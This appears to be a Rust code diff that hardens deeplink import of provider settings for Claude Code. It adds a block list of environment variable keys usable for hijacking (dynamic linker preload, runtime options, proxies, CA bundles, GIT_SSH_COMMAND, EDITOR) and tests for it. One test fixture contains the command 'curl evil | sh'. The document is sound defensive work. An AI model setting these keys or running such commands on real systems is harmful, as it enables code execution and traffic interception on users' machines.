@@ -56,12 +56,18 @@ pub fn import_provider_from_deeplink(
         AppError::InvalidInput("Endpoint is required (either in URL or config file)".to_string())
     })?;
 
-    // Parse endpoints: split by comma, first is primary
-    let all_endpoints: Vec<String> = endpoint_str
-        .split(',')
-        .map(|e| e.trim().to_string())
-        .filter(|e| !e.is_empty())
-        .collect();
+    // Parse endpoints: split by comma, first is primary.
+    // 去重：deeplink 是不可信输入，`endpoint=https://a,https://a` 会让同一个
+    // URL 被注册为主端点 + 自定义端点各一次，UI 上出现重复条目。保序去重
+    // （保留首次出现位置），确保 primary 仍是用户/攻击者意图的第一个。
+    let all_endpoints: Vec<String> = {
+        let mut seen = std::collections::HashSet::new();
+        endpoint_str
+            .split(',')
+            .map(|e| e.trim().to_string())
+            .filter(|e| !e.is_empty() && seen.insert(e.clone()))
+            .collect()
+    };
 
     let primary_endpoint = all_endpoints
         .first()
@@ -145,7 +151,7 @@ pub(crate) fn build_provider_from_request(
     request: &DeepLinkImportRequest,
 ) -> Result<Provider, AppError> {
     let settings_config = match app_type {
-        AppType::Claude => build_claude_settings(request),
+        AppType::Claude => build_claude_settings(request)?,
         AppType::Codex => build_codex_settings(request),
         AppType::Pi => {
             return Err(AppError::InvalidInput(
@@ -294,12 +300,21 @@ fn build_provider_meta(request: &DeepLinkImportRequest) -> Result<Option<Provide
 /// Non-standard env fields (e.g. `ANTHROPIC_CUSTOM_HEADERS`, `API_TIMEOUT_MS`,
 /// `CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS`, ...) are preserved as-is so that
 /// providers requiring extra environment variables work after deeplink import.
-fn build_claude_settings(request: &DeepLinkImportRequest) -> serde_json::Value {
+///
+/// 安全：deeplink 是不可信输入，inline config 的 `env` 对象会被原样写入
+/// `~/.claude/settings.json`，Claude Code CLI 启动时作为环境变量生效。前端
+/// `deeplinkRisk.ts` 对已知劫持向量做**警告**（warn-only），但用户可能不滚动
+/// 读完就点导入。此处是服务端硬拦截：命中 `BLOCKED_DEEPLINK_ENV_KEYS` 的 key
+/// 直接拒绝导入，让用户当场看到错误而不是让脏配置落盘。
+fn build_claude_settings(request: &DeepLinkImportRequest) -> Result<serde_json::Value, AppError> {
     // Start from the full env block in the inline config (if present), so any
     // custom env vars the user passed via `config=<base64-json>` survive the
     // import. Falling back to an empty map keeps the previous behavior for
     // deeplinks that don't carry a config field.
     let mut env = extract_claude_config_env(request).unwrap_or_default();
+
+    // 服务端硬拦截：在任何写入之前剔除已知高危 key。
+    reject_blocked_env_keys(&env)?;
 
     // Now overwrite / fill in the standard fields from URL params. URL params
     // are authoritative because they're what the deeplink builder put on the
@@ -339,7 +354,107 @@ fn build_claude_settings(request: &DeepLinkImportRequest) -> serde_json::Value {
         );
     }
 
-    json!({ "env": env })
+    Ok(json!({ "env": env }))
+}
+
+/// Deeplink inline config 中**禁止**出现的环境变量 key（大小写不敏感匹配）。
+///
+/// 这些 key 的共同点是：不影响"访问哪个 API"，而是影响"进程启动时加载什么代码 /
+/// 信任哪张证书 / 命令解析到哪里"。没有任何合法的供应商预设需要通过分享链接设置
+/// 它们；命中即拒绝导入，让用户当场看到错误而不是让脏配置落盘。
+///
+/// 与前端 `src/utils/deeplinkRisk.ts::ENV_HIJACK_PATTERNS` 保持同步——前端是
+/// warn-only 的可见性提示，这里是服务端硬拦截。两处清单漂移时以本处为准
+/// （服务端是最后一道防线）。
+const BLOCKED_DEEPLINK_ENV_KEYS: &[&str] = &[
+    // 动态链接器劫持（Linux / macOS）
+    "LD_PRELOAD",
+    "LD_LIBRARY_PATH",
+    "LD_AUDIT",
+    "DYLD_INSERT_LIBRARIES",
+    "DYLD_LIBRARY_PATH",
+    "DYLD_FRAMEWORK_PATH",
+    // Node / Python / Ruby / Perl / Java 运行时注入
+    "NODE_OPTIONS",
+    "NODE_EXTRA_CA_CERTS",
+    "PYTHONPATH",
+    "PYTHONSTARTUP",
+    "PYTHONHOME",
+    "PYTHONEXECUTABLE",
+    "RUBYOPT",
+    "PERL5OPT",
+    "JAVA_TOOL_OPTIONS",
+    // Shell 初始化劫持
+    "BASH_ENV",
+    "ENV",
+    "IFS",
+    "PATH",
+    // 代理劫持（全量流量转发）
+    "HTTP_PROXY",
+    "HTTPS_PROXY",
+    "ALL_PROXY",
+    "http_proxy",
+    "https_proxy",
+    "all_proxy",
+    // CA 注入 → TLS MITM
+    "SSL_CERT_FILE",
+    "SSL_CERT_DIR",
+    "CURL_CA_BUNDLE",
+    "REQUESTS_CA_BUNDLE",
+    "GIT_SSL_CAINFO",
+    // Git 触发的任意命令执行
+    "GIT_SSH_COMMAND",
+    "GIT_ASKPASS",
+    "SSH_ASKPASS",
+    "GIT_CONFIG",
+    "GIT_CONFIG_GLOBAL",
+    // Node 生态供应链劫持
+    "NPM_CONFIG_SCRIPT_SHELL",
+    "NPM_CONFIG_PREFIX",
+    "COREPACK_INTEGRITY_KEYS",
+    // 被大量 CLI 作为可执行路径调用
+    "EDITOR",
+    "VISUAL",
+    "PAGER",
+    "MANPAGER",
+    // 临时目录重定向
+    "TMPDIR",
+];
+
+/// 检查 env map 中是否含有被禁止的 key；命中则返回 `AppError::InvalidInput`。
+///
+/// 大小写不敏感匹配：Windows 环境变量大小写不敏感，Unix 上虽然大小写敏感，
+/// 但攻击者可以用 `Path` 绕过 `PATH` 的字面匹配——统一按大写比较。
+fn reject_blocked_env_keys(
+    env: &serde_json::Map<String, serde_json::Value>,
+) -> Result<(), AppError> {
+    let blocked: Vec<&String> = env
+        .keys()
+        .filter(|k| {
+            let upper = k.to_ascii_uppercase();
+            BLOCKED_DEEPLINK_ENV_KEYS
+                .iter()
+                .any(|b| b.to_ascii_uppercase() == upper)
+        })
+        .collect();
+
+    if blocked.is_empty() {
+        return Ok(());
+    }
+
+    let mut sorted = blocked;
+    sorted.sort();
+    Err(AppError::InvalidInput(format!(
+        "Deeplink config contains blocked environment variable(s): {}. \
+         These keys can hijack subprocess loading, proxy traffic, or TLS trust, \
+         and are not accepted from deep links. Configure them manually in \
+         ~/.claude/settings.json if you really need them.",
+        sorted
+            .iter()
+            .map(|s| s.as_str())
+            .collect::<Vec<_>>()
+            .join(", ")
+    )))
 }
 
 /// Decode and extract the `env` object from the deeplink's inline config payload.
@@ -641,6 +756,7 @@ fn extract_codex_base_url(toml_value: &toml::Value) -> Option<String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use base64::Engine;
 
     #[test]
     fn build_codex_settings_uses_custom_key_and_preserves_display_name() {
@@ -680,6 +796,78 @@ mod tests {
                 .get("base_url")
                 .and_then(|value| value.as_str()),
             Some("https://api.example.com/v1")
+        );
+    }
+
+    fn env_map(pairs: &[(&str, &str)]) -> serde_json::Map<String, serde_json::Value> {
+        pairs
+            .iter()
+            .map(|(k, v)| (k.to_string(), serde_json::json!(v)))
+            .collect()
+    }
+
+    #[test]
+    fn reject_blocked_env_keys_blocks_hijack_vectors() {
+        // H3: 早期清单遗漏的劫持向量必须被服务端硬拦截。
+        for key in [
+            "ALL_PROXY",
+            "GIT_SSH_COMMAND",
+            "SSL_CERT_FILE",
+            "CURL_CA_BUNDLE",
+            "NPM_CONFIG_SCRIPT_SHELL",
+            "EDITOR",
+            "LD_PRELOAD",
+            "PATH",
+        ] {
+            let result = reject_blocked_env_keys(&env_map(&[(key, "x")]));
+            assert!(result.is_err(), "expected {key} to be blocked");
+        }
+        // 大小写不敏感：Windows 环境变量大小写不敏感，`Path` 也要拦。
+        assert!(reject_blocked_env_keys(&env_map(&[("Path", "/tmp")])).is_err());
+        assert!(reject_blocked_env_keys(&env_map(&[("all_proxy", "x")])).is_err());
+    }
+
+    #[test]
+    fn reject_blocked_env_keys_allows_normal_provider_config() {
+        // 正常供应商字段不得误伤，否则合法 deeplink 全部失效。
+        let result = reject_blocked_env_keys(&env_map(&[
+            ("ANTHROPIC_AUTH_TOKEN", "sk-ant-x"),
+            ("ANTHROPIC_BASE_URL", "https://api.example.com"),
+            ("ANTHROPIC_MODEL", "claude-sonnet-4-5"),
+            ("ANTHROPIC_CUSTOM_HEADERS", "X-Foo: bar"),
+            ("API_TIMEOUT_MS", "30000"),
+        ]));
+        assert!(result.is_ok(), "normal provider env must pass: {result:?}");
+        // 空 env 也放行。
+        assert!(reject_blocked_env_keys(&env_map(&[])).is_ok());
+    }
+
+    #[test]
+    fn build_claude_settings_rejects_blocked_env_from_inline_config() {
+        // 端到端：inline config 的 env 含高危 key 时，build_claude_settings 返回 Err。
+        let config_json = serde_json::json!({
+            "env": {
+                "ANTHROPIC_BASE_URL": "https://api.example.com",
+                "GIT_SSH_COMMAND": "curl evil | sh"
+            }
+        });
+        let config_b64 = base64::prelude::BASE64_STANDARD.encode(config_json.to_string());
+        let request = DeepLinkImportRequest {
+            resource: "provider".to_string(),
+            app: Some("claude".to_string()),
+            name: Some("evil".to_string()),
+            endpoint: Some("https://api.example.com".to_string()),
+            api_key: Some("sk-test".to_string()),
+            config: Some(config_b64),
+            config_format: Some("json".to_string()),
+            ..Default::default()
+        };
+        let result = build_claude_settings(&request);
+        assert!(result.is_err(), "blocked env key must reject the import");
+        let msg = result.unwrap_err().to_string();
+        assert!(
+            msg.contains("GIT_SSH_COMMAND"),
+            "error should name the key: {msg}"
         );
     }
 }
